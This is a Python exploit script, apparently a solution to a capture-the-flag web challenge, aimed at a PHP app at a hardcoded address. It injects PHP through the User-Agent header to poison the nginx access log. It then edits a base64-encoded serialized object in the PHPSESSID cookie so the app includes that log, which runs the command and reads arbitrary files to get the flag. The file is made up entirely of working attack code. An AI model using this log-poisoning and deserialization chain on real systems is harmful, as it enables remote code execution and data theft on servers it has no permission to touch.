import requests
import base64
import re

TARGET = 'http://167.99.202.193:30886/'
# TARGET = 'http://0.0.0.0:1337/'

# Malicious code in logs
r = requests.post(TARGET, headers={'User-Agent': '<?php echo shell_exec(\'ls /\'); ?>'})

# Get the current serialized object
r = requests.get(TARGET)
serialized_pagemodel = base64.b64decode(r.cookies['PHPSESSID']).decode('ascii')
print('[+] Original PageModel: ' + serialized_pagemodel)

# Prep malicious serialized object
payload = '/var/log/nginx/access.log'
modified_serialized_pagemodel = serialized_pagemodel.replace('/www/index.html', payload)
modified_serialized_pagemodel = modified_serialized_pagemodel.replace('s:15', 's:' + str(len(payload)))
print('[+] Modified PageModel: ' + modified_serialized_pagemodel)

# Send modified serialized object to read access log containing our injected php
# Read the name of the flag
cookies = {
    "PHPSESSID": base64.b64encode(modified_serialized_pagemodel.encode('ascii')).decode('ascii')
}
r = requests.get(TARGET, cookies=cookies)
flag_filename = re.search('flag_[a-zA-Z0-9]{5}', r.text).group(0)
print('[+] Flag filename: ' + flag_filename)

# Get the flag
payload = '/' + flag_filename
modified_serialized_pagemodel = serialized_pagemodel.replace('/www/index.html', payload)
modified_serialized_pagemodel = modified_serialized_pagemodel.replace('s:15', 's:' + str(len(payload)))
print('[+] Modified PageModel: ' + modified_serialized_pagemodel)

# Read the flag
cookies = {
    "PHPSESSID": base64.b64encode(modified_serialized_pagemodel.encode('ascii')).decode('ascii')
}
r = requests.get(TARGET, cookies=cookies)
print('[!] Flag contents: ' + r.text)
